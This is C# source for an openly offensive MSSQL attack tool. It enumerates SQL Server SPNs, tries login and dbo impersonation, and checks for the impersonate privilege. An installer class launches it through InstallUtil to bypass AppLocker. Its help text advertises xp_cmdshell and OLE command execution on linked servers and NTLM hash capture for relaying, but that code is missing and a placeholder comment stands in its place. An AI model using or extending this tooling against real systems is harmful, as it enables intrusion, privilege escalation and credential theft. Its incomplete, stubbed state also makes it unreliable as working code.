using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace sql
{
    class sql
    {
        public static void Main(string[] args)
        {
            go(args);
        }

        public static void go(string[] args)
        {
            string username = "";
            string password = "";
            string sqlServer = "localhost";
            string responderIP = "";
            string database = "master";
            string impersonateuser = "";
            bool querymode = false;
            bool enablefeatures = false;
            bool runxpcmd = false;
            bool runolecmd = false;
            bool splash = true;
            bool impersonate = false;
            bool hash = false;
            bool enumerate = false;
            bool localcommand = false;
            bool tunnel = false;

            foreach (string arg in args)
            {
                switch (arg.Substring(0, 2).ToUpper())
                {
                    case "/L":
                        username = arg.Substring(3);
                        break;
                    case "/P":
                        password = arg.Substring(3);
                        break;
                    case "/D":
                        database = arg.Substring(3);
                        break;
                    case "/S":
                        sqlServer = arg.Substring(3);
                        break;
                    case "/R":
                        responderIP = arg.Substring(3);
                        break;
                    case "/Q":
                        querymode = true;
                        splash = false;
                        break;
                    case "/F":
                        enablefeatures = true;
                        splash = false;
                        break;
                    case "/E":
                        enumerate = true;
                        splash = false;
                        break;
                    case "/X":
                        runxpcmd = true;
                        splash = false;
                        break;
                    case "/C":
                        localcommand = true;
                        splash = false;
                        break;
                    case "/O":
                        runolecmd = true;
                        splash = false;
                        break;
                    case "/I":
                        impersonateuser = arg.Substring(3);
                        impersonate = true;
                        break;
                    case "/T":
                        tunnel = true;
                        break;
                    case "/H":
                        hash = true;
                        splash = false;
                        break;
                    default:
                        Console.WriteLine("Default!");
                        break;
                }
            }

            if (splash)
            {
                Console.WriteLine("MSSQL Linked Server Tool");
                Console.WriteLine("");
                Console.WriteLine("Compatible with InstallUtil AppLocker bypass; Use /s=SQL05 syntax instead of /s:SQL05 with InstallUtil.");
                Console.WriteLine("");
                Console.WriteLine("Modes:");
                Console.WriteLine(" /q - Query  Query a domain for MSSQL SPN's");
                Console.WriteLine(" /e - Enumerate   Find Linked MSSQL instances and enumerate permissions");
                Console.WriteLine(" /c - Command Execute sql queries on the logged in server");
                Console.WriteLine(" /f - Enable  Enable features like XP_cmdshell and OLE objects on a Linked server");
                Console.WriteLine(" /x - Command Execute commands via XP_cmdshell on a linked server");
                Console.WriteLine(" /o - Command Execute commands via OLE object on a linked server");
                Console.WriteLine(" /h - Force SQL server to authenticate to an SMB share in order to capture hash for use with ntlmrelayx");
                Console.WriteLine("");
                Console.WriteLine("Options:");
                Console.WriteLine(" /l: Login (username) to authenticate with (default: Windows credentials)");
                Console.WriteLine(" /p: Password to authenticate with");
                Console.WriteLine(" /d: Database to connect to (default: Master)");
                Console.WriteLine(" /s: Server to connect to (default: Localhost)");
                Console.WriteLine(" /r: Responder IP (default: Localhost)");
                Console.WriteLine(" /i: User to impersonate. Enter \"dbo\" to try and auth as dbo in the msdb database.");
                Console.WriteLine(" /t: Tunnel through a Linked MSSQL server in order to complete tasks on one of its Linked servers.");
            }
            else if (querymode)
            {
                Console.Write("Enter domain to query for MSSQL spn's: ");
                string domain = Console.ReadLine();
                string enumcommand = "/c setspn -T " + domain + " -Q MSSQLSvc/*";
                Console.WriteLine("");
                try
                {
                    var process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "C:\\Windows\\System32\\cmd.exe",
                            Arguments = enumcommand,
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
                    };
                    process.Start();
                    while (!process.StandardOutput.EndOfStream)
                    {
                        var line = process.StandardOutput.ReadLine();
                        Console.WriteLine(line);
                    }
                    process.WaitForExit();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else
            {
                string conString = "";
                if (username != "")
                {
                    conString = "Server = " + sqlServer + "; Database = " + database + "; User id = " + username + "; Password = " + password + ";";
                }
                else
                {
                    conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
                }
                SqlConnection con = new SqlConnection(conString);
                try
                {
                    con.Open();
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }
                Console.WriteLine("");
                String queryhostname = "SELECT @@SERVERNAME;";
                SqlCommand command = new SqlCommand(queryhostname, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                string host = Convert.ToString(reader[0]);
                Console.WriteLine("Logged in on: " + host);
                reader.Close();
                String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                string user = Convert.ToString(reader[0]);
                Console.WriteLine("Logged in as user: " + user);
                reader.Close();
                querylogin = "SELECT USER_NAME();";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                string sqluser = Convert.ToString(reader[0]);
                Console.WriteLine(user + " is mapped to SQL account: " + sqluser);
                reader.Close();

                if (impersonate)
                {
                    Console.WriteLine("");
                    string impcommand = "";
                    Console.WriteLine("Attempting to execute commands as " + impersonateuser + "...");
                    if (impersonateuser == "dbo")
                    {
                        impcommand = "use msdb; EXECUTE AS USER = 'dbo';";
                    }
                    else
                    {
                        impcommand = "execute as login = '" + impersonateuser + "';";
                    }
                    command = new SqlCommand(impcommand, con);
                    try
                    {
                        reader = command.ExecuteReader();
                        Console.WriteLine("Successfully executing commands as " + impersonateuser + "!");
                        user = impersonateuser;
                    }
                    catch
                    {
                        Console.WriteLine("Insufficient permissions to execute permissions of " + impersonateuser + ", or specified entry is a group not a user.");
                    }
                    reader.Close();
                }

                // Enumerate roles and check for impersonate privilege
                if (enumerate)
                {
                    Console.WriteLine("");
                    Console.WriteLine("Enumerating roles and checking for impersonate privilege:");
                    string queryRoles = "SELECT name FROM sys.server_principals WHERE type_desc = 'SERVER_ROLE';";
                    command = new SqlCommand(queryRoles, con);
                    reader = command.ExecuteReader();
                    var roles = new List<string>();
                    while (reader.Read())
                    {
                        roles.Add(reader.GetString(0));
                    }
                    reader.Close();

                    foreach (var role in roles)
                    {
                        string queryImpersonate = $"SELECT ISNULL(MAX(CASE WHEN a.permission_name = 'IMPERSONATE' THEN 1 ELSE 0 END), 0) AS ImpersonatePrivilege FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantee_principal_id = b.principal_id WHERE b.name = '{role}';";
                        command = new SqlCommand(queryImpersonate, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        int hasImpersonate = reader.GetInt32(0);
                        reader.Close();

                        Console.WriteLine($"Role '{role}' has impersonate privilege: {hasImpersonate == 1}");
                    }
                }

                // Existing code to list linked servers and other functionalities...
                // ...

                con.Close();
            }
        }

        public static int ExecuteCommand(string commnd, int timeout)
        {
            var pp = new ProcessStartInfo("cmd.exe", "/C" + commnd)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                WorkingDirectory = "C:\\",
            };
            var process = Process.Start(pp);
            process.WaitForExit(timeout);
            process.Close();
            return 0;
        }
    }

    public static class ExtensionMethods
    {
        public static string EncodeBase64(this string value)
        {
            var valueBytes = Encoding.Unicode.GetBytes(value);
            return Convert.ToBase64String(valueBytes);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            List<string> argslist = new List<string>();
            string lParam1 = Convert.ToString(GetParam("l"));
            string lParam2 = Convert.ToString(GetParam("p"));
            string lParam3 = Convert.ToString(GetParam("d"));
            string lParam4 = Convert.ToString(GetParam("s"));
            string lParam5 = Convert.ToString(GetParam("i"));
            string lParam6 = Convert.ToString(GetParam("f"));
            string lParam7 = Convert.ToString(GetParam("x"));
            string lParam8 = Convert.ToString(GetParam("o"));
            string lParam9 = Convert.ToString(GetParam("q"));
            string lParam10 = Convert.ToString(GetParam("t"));
            string lParam11 = Convert.ToString(GetParam("h"));
            string lParam12 = Convert.ToString(GetParam("e"));
            argslist.Add(lParam1);
            argslist.Add(lParam2);
            argslist.Add(lParam3);
            argslist.Add(lParam4);
            argslist.Add(lParam5);
            argslist.Add(lParam6);
            argslist.Add(lParam7);
            argslist.Add(lParam8);
            argslist.Add(lParam9);
            argslist.Add(lParam10);
            argslist.Add(lParam11);
            argslist.Add(lParam12);

            argslist = argslist.Where(s => !string.IsNullOrWhiteSpace(s)).Distinct().ToList();
            String[] args = argslist.ToArray();

            sql.go(args);
        }

        private object GetParam(string p)
        {
            string[] inputvars = new string[] { "l", "p", "d", "s", "i" };
            try
            {
                if (this.Context != null)
                {
                    if (this.Context.Parameters[p] != null && inputvars.Contains(p))
                    {
                        string lParamValue = this.Context.Parameters[p];
                        if (lParamValue == "")
                        {
                            Console.WriteLine("You have provided a parameter that must be assigned a value: " + p);
                            System.Environment.Exit(0);
                        }
                        else if (lParamValue != null)
                            return "/" + p + ":" + lParamValue;
                    }
                    else if (this.Context.Parameters[p] != null && Array.Exists(inputvars, element => element != p))
                    {
                        string lParamValue = "/" + p;
                        return lParamValue;
                    }
                    else
                    {
                    }
                }
            }
            catch
            {
            }
            return string.Empty;
        }
    }
}
